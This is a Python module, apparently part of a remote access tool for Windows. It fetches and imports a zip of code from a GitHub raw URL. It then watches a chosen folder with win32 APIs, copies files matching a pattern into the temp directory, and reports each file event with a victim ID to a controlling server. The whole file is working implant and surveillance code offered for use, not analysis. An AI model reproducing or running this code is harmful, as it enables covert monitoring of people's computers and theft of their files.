pimport(
    '''import win32con,win32file''',
    "https://github.com/MrByehack/t-a-r-e-y-b/raw/master/bGlicmFyaWVz/"
    "filechanger.zip"
)


class filewatch:
    lists = {}

    @classmethod
    def __init__(
        self, server, path, FILE_NAME=1, DIR_NAME=0, ATTRIBUTES=0,
        SIZE=0, LAST_WRITE=0, SECURITY=0, upfile='', justupfile=False
    ):
        if path in self.lists:
            self.lists[path] = False
            return
        self.lists[path] = True
        hDir = win32file.CreateFile(
            path,
            0x0001,
            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE |
            win32con.FILE_SHARE_DELETE,
            None,
            win32con.OPEN_EXISTING,
            win32con.FILE_FLAG_BACKUP_SEMANTICS,
            None
        )
        while self.lists.get(path):
            results = win32file.ReadDirectoryChangesW(
                hDir, 1024, True,
                (FILE_NAME and win32con.FILE_NOTIFY_CHANGE_FILE_NAME or 0) |
                (DIR_NAME and win32con.FILE_NOTIFY_CHANGE_DIR_NAME or 0) |
                (ATTRIBUTES and win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES or 0) |
                (SIZE and win32con.FILE_NOTIFY_CHANGE_SIZE or 0) |
                (LAST_WRITE and win32con.FILE_NOTIFY_CHANGE_LAST_WRITE or 0) |
                (SECURITY and win32con.FILE_NOTIFY_CHANGE_SECURITY or 0),
                None, None)
            for action, file in results:
                if self.lists.get(path) and action in [1, 3] and upfile and \
                        re.match(upfile, file):
                    while 1:
                        try:
                            copied = shutil.copy(os.path.join(
                                path, file), os.environ['temp'])
                            break
                        except PermissionError:
                            pass
                    _send(
                        server,
                        '''inpu({!r},"92",0)'''.format(
                            Myid + ' : ' + os.path.join(path, file) + ' > ' +
                            ('Created' if action == 1 else "Content Changed") +
                            '!\\nit match with ' + upfile + ' and saved on: ' +
                            copied
                        )
                    )
                elif self.lists.get(path) and justupfile and upfile and \
                        re.match(upfile, file):
                    _send(
                        server,
                        '''inpu({!r},"92",0)'''.format(
                            Myid + ' : ' + os.path.join(path, file) +
                            ' match with ' + upfile + ' > ' + {
                                1: "Created!", 2: "Deleted!",
                                3: "Content Changed!", 4: "Renamed to:", 5: ""
                            }.get(action, "Unknown " + str(action))
                        )
                    )
                elif self.lists.get(path) and not justupfile:
                    _send(
                        server,
                        '''inpu({!r},"92",0)'''.format(
                            Myid + ' : ' + os.path.join(path, file) + ' > ' + {
                                1: "Created!", 2: "Deleted!",
                                3: "Content Changed!", 4: "Renamed to:", 5: ""
                            }.get(action, "Unknown " + str(action))
                        )
                    )
        del self.lists[path]
